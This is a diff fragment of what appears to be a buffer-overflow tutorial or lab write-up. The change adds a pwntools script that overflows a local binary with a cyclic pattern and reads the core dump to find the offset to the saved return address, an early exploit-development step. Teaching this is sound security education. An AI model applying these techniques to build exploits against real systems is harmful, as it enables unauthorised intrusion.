@@ -13,7 +13,19 @@ int main() {
     return 0;
 } 
 ```
-Find offset to the RIP (how many bytes to RIP)
+Find offset to the RIP (how many bytes to RIP) using this code
+```python
+from pwn import *
+
+p = process('./main')
+p.sendline(cyclic(100))
+p.wait()
+
+core = p.corefile
+print(cyclic_find(core.read(core.rsp, 8)))
+```
+This results in this output:
+
 ```shell
     Arch:      amd64-64-little
     RIP:       0x40119f
